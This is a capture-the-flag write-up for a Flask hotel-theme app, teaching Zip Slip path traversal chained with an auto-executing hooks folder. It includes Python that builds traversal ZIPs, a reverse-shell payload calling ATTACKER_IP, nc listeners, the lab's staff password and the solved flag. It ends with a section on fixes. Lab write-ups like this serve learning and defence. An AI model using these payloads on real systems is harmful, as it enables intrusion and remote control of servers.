# 🐚 The Hollow Shell — Complete Notes 
**Target:** `10.49.180.247` | **Open Ports:** 22 (SSH), 5000 (HTTP) **Category:** Web | **Difficulty:** Medium | **Points:** 90 **Solved by:** Obito Uchiha — Team AKATSUKI

---

## 📖 What Is This Challenge About?

This is a **web application** run by the "Byte Lotus Hotel." In this app, hotel staff can set the ambiance (background theme, like beach sounds, images) on guests' in-room tablets. To do this, they upload a **ZIP file** called a "shell" (this is also where the challenge name comes from — "Hollow Shell," like an empty seashell you can put anything into).

The core idea of this challenge is: **when a web application lets you upload a file, and it "extracts" (unzips) that file on the server, if it doesn't properly control the extraction process, an attacker can hijack that extraction and write files anywhere they want.**

---

## 🧠 For Beginners: Concepts You Need First

If you had to explain this challenge to a younger sibling from absolute zero, these 4 concepts need to be clear first:

### 1️⃣ What Is a ZIP File?

A ZIP is a **compressed archive** — meaning many files are bundled into a single file so they can be transferred easily. When you "extract" a ZIP, every file inside comes back out into its own location.

**Real-life example:** Imagine you have a suitcase where you've neatly folded and packed your clothes. A ZIP file is the same idea — lots of things (files) packed into one container (ZIP). Extracting means opening the suitcase and putting everything back into the closet.

### 2️⃣ What Is a File Path, and What Does `../` Mean?

Every file on a computer lives at a specific location (folder), like:

```
/home/user/photos/beach.jpg
```

Now, `../` is a special symbol that means **"go up one folder"** (the parent directory).

**Real-life example:** Imagine you're in a building, and your room is on the 5th floor. Saying `../` means "go down one floor." If you keep writing `../../../` repeatedly, you can go all the way down to the ground floor, and even outside the building entirely — meaning you can leave your "allowed area" (your room) altogether.

Similarly, if a file's name is `../../etc/passwd`, this is an attempt to place the file in a completely different, sensitive system location — one it was never supposed to reach.

### 3️⃣ What Is the Zip Slip Vulnerability?

When an application extracts a ZIP file, it should never blindly trust the name (path) written inside each file entry. If the application doesn't verify that the extracted file **stays within its allowed folder**, an attacker can name a file inside the ZIP something like `../../hooks/evil.py` — and when the server extracts that ZIP, the file escapes its allowed folder and gets written **anywhere the attacker wants**.

This is called **Zip Slip (CWE-22, Path Traversal via archive extraction)**.

**Real-life example:** Imagine a hotel where every guest gets their own locker (like `shells/<unique-id>/`), and guests are only supposed to store their belongings there. But if the locker's lock is broken, and a guest labels their bag "please store this in the Manager's office" — and staff blindly follow the label without checking — the guest can now put their belongings anywhere, whether it's the Manager's office or the Reception safe. **That's exactly Zip Slip** — the server is blindly following the "label" (file path) without verifying it stays inside the allowed area.

### 4️⃣ What Is RCE (Remote Code Execution)?

RCE means an attacker can run their own commands or scripts on a server — as if they were physically sitting in front of that computer. This is the most dangerous vulnerability class because the attacker can gain full control.

**Real-life example:** Imagine your house has an "automatic cleaning robot" that reads a to-do list placed in a specific folder (`hooks/`) every day and follows its instructions. If some outsider secretly slips their own list into that folder (like "send all the house data to me"), the robot will follow it without question, since it doesn't check who wrote the list. This is exactly what happens in this challenge — the application has a "theme worker" (like the cleaning robot) that looks inside the `hooks/` folder and executes whatever it finds there.

---

## 🛠️ Technologies Involved

|Component|What It Is|
|---|---|
|**Flask**|Python web framework — this app's backend is built on it (confirmed via the gunicorn server header)|
|**gunicorn**|A WSGI server used to run Python web apps in production|
|**Python `zipfile` module**|Used to create/read ZIP files — we used it to build our exploit archives|
|**Signed session cookies**|After login, Flask gives a signed cookie (`session=eyJ...`) containing data like `{"staff": "concierge"}` — it's encoded but not encrypted, so it's readable (base64)|
|**netcat (nc)**|Used to catch the reverse shell connection|
|**Python `socket` + `pty` modules**|Used to build the reverse shell payload — `socket` establishes the network connection, `pty` spawns a real interactive terminal (bash)|

---

## 🕵️ Vulnerabilities Used (Chain)

1. **Zip Slip (Path Traversal in Archive Extraction)** — CWE-22 The server extracted ZIP file paths without sanitizing them, letting us escape the `shells/<id>/` directory and write files into any folder on the system.
    
2. **Insecure Automation / Unsandboxed Script Execution** The application's "theme worker" periodically scans the `hooks/` folder and **executes** any `.py` file found there — without any validation, signing, or sandboxing.
    

**Combining these two gave us full RCE (Remote Code Execution).**

> **Interesting Twist:** This room was titled **"(Patched)"**. We found that the manifest-declared `"hooks": ["curl ..."]` JSON array method **had been patched** — that command was not executing. But the patch only fixed a symptom, not the root cause (Zip Slip). We discovered the worker independently scans the `hooks/` folder for `.py` files and runs them — even if that file was never declared in the manifest at all. So we used Zip Slip to directly drop a `.py` file into the `hooks/` folder, and it executed automatically.
> 
> **Lesson:** When patching a vulnerability, don't just fix the symptom — fix the root cause. Here, only "ignoring the hooks array" was patched, but "sanitizing the extraction path" (the actual root cause) was missed entirely.

---

## 🪜 Path From Beginner to This Challenge

If someone wanted to learn from absolute zero how to reach this level, here's the progression to follow:

**Step 1 — Understand Web & HTTP Basics** First understand how websites work: the browser sends a **request** to the server (GET, POST), and the server sends back a **response**. Tools: `curl`, browser DevTools.

**Step 2 — Get Comfortable With the Linux Command Line** `curl`, `zip`, `unzip`, `nc`, basic Python scripting — these are everyday tools you'll need constantly in CTFs.

**Step 3 — Understand Authentication (Login, Cookies, Sessions)** Understand that after logging in, the server gives you a **cookie** that preserves your identity for future requests. Practice with `curl -c cookies.txt` and `-b cookies.txt`.

**Step 4 — Study the File Upload Vulnerabilities Category** There's an entire category in web security called "insecure file upload" — including: uploading malicious file extensions, spoofing file types, and **archive extraction attacks (Zip Slip)**. Search "Zip Slip vulnerability explained" on YouTube, or read OWASP's documentation.

**Step 5 — Practice the Path Traversal (`../`) Concept** Write a small Python script yourself that creates a ZIP containing a path like `../../somefile.txt`, and observe how the path appears when you run `unzip -l`.

**Step 6 — Ask Yourself: "If I can write an arbitrary path inside this file, what can I achieve?"** This is exactly the attacker mindset — you realized that if you can drop a file into the `hooks/` folder, and that folder is meant for "auto-executed scripts," then you've achieved RCE.

**Step 7 — Understand the Reverse Shell Concept** A reverse shell means: the target machine itself initiates a connection back to your (the attacker's) computer, giving you control of its terminal. Behind this is the concept of `socket` (network connection) and `pty` (pseudo-terminal, which creates a real interactive terminal like bash).

**Step 8 — Practice Chaining Vulnerabilities Together** In real CTFs, you rarely get the flag from a single bug. Here, we **combined two bugs**: Zip Slip (write) + auto-exec worker (execute) = RCE. This "vulnerability chaining" skill is essential for every medium/hard CTF.

---

## 💻 Full Command Walkthrough

### Step 1 — Recon

```bash
nmap -Pn -sC -sV 10.49.180.247
```

**Why:** First, you need to see which ports/services are open on the target. Found: 22 (SSH) and 5000 (a custom HTTP app — gunicorn/Flask).

---

### Step 2 — Login and Capture Session Cookie

```bash
curl -i -c cookies.txt -X POST http://10.49.180.247:5000/login \
  -d 'username=concierge&password=StayNoticed2024!'
```

**Why:** The application is authenticated, so we first need to log in with the staff credentials. `-c cookies.txt` saves the cookie to a file so it can be reused in future requests.

---

### Step 3 — Exploring the Dashboard

```bash
curl -s -b cookies.txt http://10.49.180.247:5000/dashboard
```

**Why:** This revealed the upload endpoint is `POST /upload`, the field name is `shell`, and the manifest file is accessible at `/shells/<id>/shell.json`.

---

### Step 4 — Baseline (Normal) Shell Upload Test

```bash
printf '%s\n' '{"name":"test","assets":[]}' > shell.json
zip baseline.zip shell.json
curl -i -b cookies.txt -X POST http://10.49.180.247:5000/upload -F "shell=@baseline.zip"
```

**Why:** It's important to test the normal flow first — to see how the upload gets accepted and what the extraction folder naming pattern looks like, so we can later compare against the exploit's behavior.

---

### Step 5 — Zip Slip Proof of Concept

```python
import json, zipfile
manifest = {"name": "zipslip-proof", "assets": []}
with zipfile.ZipFile("zipslip-proof.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../static/zipslip-proof.css", "ZIP_SLIP_CONFIRMED\n")
```

**Why:** This test matters because it checks whether the application validates ZIP entry paths at all. We used the path `../../static/` — this "escapes" into a location the file should never normally reach.

```bash
curl -i -b cookies.txt -X POST http://10.49.180.247:5000/upload -F "shell=@zipslip-proof.zip"
curl -s http://10.49.180.247:5000/static/zipslip-proof.css
```

**Result:** We got `ZIP_SLIP_CONFIRMED` — confirming our file really was written into the `static/` folder, proving the **Zip Slip vulnerability exists**.

---

### Step 6 — Testing the JSON `hooks` Field (Found to Be Patched)

```json
{"name": "callback-test", "assets": [], "hooks": ["curl http://ATTACKER:8000/"]}
```

**Why:** The app's description mentioned an "automation hooks" feature that runs commands. We tried this direct approach first. The manifest saved this field, but no actual execution happened — this was our first clue that this room's "(Patched)" label was real.

---

### Step 7 — Using Zip Slip to Drop a Script Directly Into `hooks/`

```python
import json, zipfile
manifest = {"name": "hooks-drop-test", "assets": []}
callback = 'import os,socket\nsock=socket.socket()\nsock.connect(("ATTACKER_IP",8000))\nsock.send(b"HOOKS_DROP_WORKED\\n")\n'
with zipfile.ZipFile("hooks-drop-test.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/dropcheck.py", callback)
```

**Why:** Since the JSON `hooks` field didn't work, we thought — maybe the worker scans the `hooks/` folder itself, regardless of whether a file was declared in the JSON or not. So we used Zip Slip to drop a `.py` file directly into that folder, to test whether the worker picks it up and executes it.

```bash
nc -lvnp 8000
curl -i -b cookies.txt -X POST http://10.49.180.247:5000/upload -F "shell=@hooks-drop-test.zip"
```

**Result:** We received the `HOOKS_DROP_WORKED` message on our `nc` listener — **confirming** that the worker independently scans the `hooks/` folder and executes `.py` files. This became our **RCE primitive**.

---

### Step 8 — Full Reverse Shell

```python
import json, zipfile
LHOST, LPORT = "ATTACKER_IP", 4444
manifest = {"name": "shoreline-update", "assets": []}
callback = f'''
import os, pty, socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))
for fd in (0,1,2): os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''
with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

**Why this code does what it does (line by line):**

- `socket.socket(...)` — creates a network connection object (like connecting a phone line)
- `sock.connect((LHOST, LPORT))` — connects from the target machine back to the attacker's (our) machine, at the IP:PORT where our `nc` listener is running
- `os.dup2(sock.fileno(), fd)` — redirects the target machine's input/output/error (stdin, stdout, stderr) into our network connection — meaning whatever the target machine "types" now comes to us, and whatever we type executes on the target
- `pty.spawn("/bin/bash")` — starts a real interactive bash terminal, tied to our connection

**Real-life example:** Imagine you secretly planted a walkie-talkie inside the target's house that automatically connects to your own walkie-talkie the moment a button is pressed — and now you can both hear what's happening inside and give commands. That's exactly what a reverse shell is.

```bash
nc -lvnp 4444
curl -i -b cookies.txt -X POST http://10.49.180.247:5000/upload -F "shell=@reverse-shell.zip"
```

**Result:** After waiting a bit (for the worker's processing cycle), we received the target machine's bash shell on `nc -lvnp 4444` — full remote code execution!

---

### Step 9 — Flag Retrieval

After getting the shell, we explored the system to find the flag file (e.g. using `find / -name "*flag*" 2>/dev/null`, or checking common locations like `/root/`, `/home/*/`).

**Flag:**

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## 🔐 Root Cause & Fix (Understand the Defensive Side Too)

**Vulnerability:** Zip Slip (CWE-22) + unsandboxed automation hook execution.

**What the Correct Fix Should Have Been:**

1. **Validate paths during extraction:** Check that every ZIP entry's final resolved path stays **within** the intended folder (verify with `os.path.commonpath`, or reject any entry containing `..` outright).
2. **An "auto-execute" feature like `hooks/` is inherently dangerous** — executing any user-uploaded content without sandboxing/allowlisting is extremely risky. Best practice: remove this feature entirely, or heavily restrict it (signed scripts only, command allowlists, execution inside an isolated container).
3. **Least privilege:** Run the process that extracts ZIPs and the worker that executes hooks with minimum permissions — so even if exploited, the damage stays limited.

**Real-life analogy:** This is like a building where the security guard only checks the "front gate" but leaves the "back gate" wide open. The attacker couldn't get in through the front gate (JSON hooks), so they went through the back gate (Zip Slip write) instead. Real security means securing **every entry point**, not just patching one symptom.

---

_Notes prepared by Obito Uchiha — Team AKATSUKI 🐚_